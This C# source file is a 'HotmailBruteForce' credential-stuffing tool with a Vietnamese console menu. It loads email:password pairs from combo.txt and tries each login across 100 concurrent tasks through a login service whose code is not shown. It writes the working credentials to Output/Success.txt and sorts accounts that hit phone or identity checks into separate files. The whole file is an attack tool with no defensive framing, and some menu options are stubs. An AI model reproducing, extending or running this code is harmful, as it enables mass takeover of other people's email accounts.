using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace HotmailBruteForce
{
    public class Program
    {
        static async Task Main(string[] args)
        {
            ConfigConsole();
            await MainMenu();
        }
        // Config for console
        public static void ConfigConsole()
        {
            Console.OutputEncoding = Encoding.UTF8;
            Console.ForegroundColor = ConsoleColor.DarkBlue;
        }
        // Menu Setting
        static async Task MainMenu()
        {
            bool keepRunning = true;

            while (keepRunning)
            {
                Console.Clear();
                Console.WriteLine("----- Menu -----");
                Console.WriteLine("1. Hotmail Full Capture ( with proxy )");
                Console.WriteLine("2. Hotmail Full Capture ( without proxy )");
                Console.WriteLine("0. Thoát");
                Console.Write("Chọn một số: ");

                string choice = Console.ReadLine();

                switch (choice)
                {
                    case "1":
                        await ProcessingWithThreads();
                        Console.ReadLine(); // Dừng màn hình cho đến khi người dùng nhấn Enter
                        break;
                    case "2":
                        Console.WriteLine("Bạn đã chọn lựa chọn 2");
                        Console.ReadLine();
                        break;
                    case "3":
                        Console.WriteLine("Bạn đã chọn lựa chọn 3");
                        Console.ReadLine();
                        break;
                    case "0":
                        keepRunning = false;
                        break;
                    default:
                        Console.WriteLine("Lựa chọn không hợp lệ. Vui lòng chọn lại.");
                        Console.ReadLine();
                        break;
                }
            }
        }
        // process file txt
        public static async Task ProcessingWithThreads()
        {
            Console.Clear();
            string filePath = "combo.txt";
            var queue = new ConcurrentQueue<string>();

            using (var reader = new StreamReader(filePath))
            {
                string line;
                while ((line = await reader.ReadLineAsync()) != null)
                {
                    queue.Enqueue(line);
                }
            }

            int totalLines = queue.Count;

            var stats = new ConcurrentDictionary<string, int>
            {
                ["Processed"] = 0,
                ["Success"] = 0,
                ["Fails"] = 0,
                ["Veriphone"] = 0,
                ["Identity"] = 0,
                ["Retries"] = 0,
                ["Other"] = 0
            };

            Directory.CreateDirectory("Output");

            var successWriter = new StreamWriter("Output/Success.txt", append: true);
            var failsWriter = new StreamWriter("Output/Fails.txt", append: true);
            var veriphoneWriter = new StreamWriter("Output/Veriphone.txt", append: true);
            var identityWriter = new StreamWriter("Output/Identity.txt", append: true);
            var retriesWriter = new StreamWriter("Output/Retries.txt", append: true);
            var otherWriter = new StreamWriter("Output/Other.txt", append: true);

            var checkerTasks = Enumerable.Range(0, 100).Select(async _ =>
            {
                while (!queue.IsEmpty)
                {
                    if (queue.TryDequeue(out var line))
                    {
                        (string email, string password) = ParseEmailAndPassword(line);

                        if (!string.IsNullOrEmpty(email) && !string.IsNullOrEmpty(password))
                        {
                            string result = await Services.InitializeLoginMethod(email, password);

                            Console.WriteLine($"{email}:{password}|{result}");

                            stats.AddOrUpdate("Processed", 1, (key, oldValue) => oldValue + 1);
                            stats.AddOrUpdate(result, 1, (key, oldValue) => oldValue + 1);

                            var writer = GetWriterForResult(result, successWriter, failsWriter, veriphoneWriter, identityWriter, otherWriter, retriesWriter);
                            await writer.WriteLineAsync($"{email}:{password}");

                            UpdateConsoleTitle(stats, totalLines);
                        }
                        else
                        {
                            Console.WriteLine("Dòng không hợp lệ");
                        }
                    }
                }
            });

            await Task.WhenAll(checkerTasks);

            // Giải phóng tài nguyên
            successWriter.Dispose();
            failsWriter.Dispose();
            veriphoneWriter.Dispose();
            identityWriter.Dispose();
            retriesWriter.Dispose();
            otherWriter.Dispose();
        }

        private static StreamWriter GetWriterForResult(string result, StreamWriter successWriter, StreamWriter failsWriter, StreamWriter veriphoneWriter, StreamWriter identityWriter, StreamWriter otherWriter, StreamWriter retriesWriter)
        {
            if (result == "Success")
                return successWriter;
            else if (result == "Fails")
                return failsWriter;
            else if (result == "Veriphone")
                return veriphoneWriter;
            else if (result == "Identity")
                return identityWriter;
            else if (result == "Retries")
                return retriesWriter;
            else
                return otherWriter;
        }
        private static void UpdateConsoleTitle(ConcurrentDictionary<string, int> stats, int totalLines)
        {
            Console.Title = $"Processed: {stats["Processed"]}/{totalLines} | Success: {stats["Success"]} | Fails: {stats["Fails"]} | Veriphone: {stats["Veriphone"]} | Identity: {stats["Identity"]} | Other: {stats["Other"]}";
        }
        // helper function
        public static (string email, string password) ParseEmailAndPassword(string line)
        {
            string[] parts = line.Split(':');
            if (parts.Length == 2)
            {
                string email = parts[0];
                string password = parts[1];
                return (email, password);
            }
            else
            {
                return (null, null);
            }
        }
    }
}
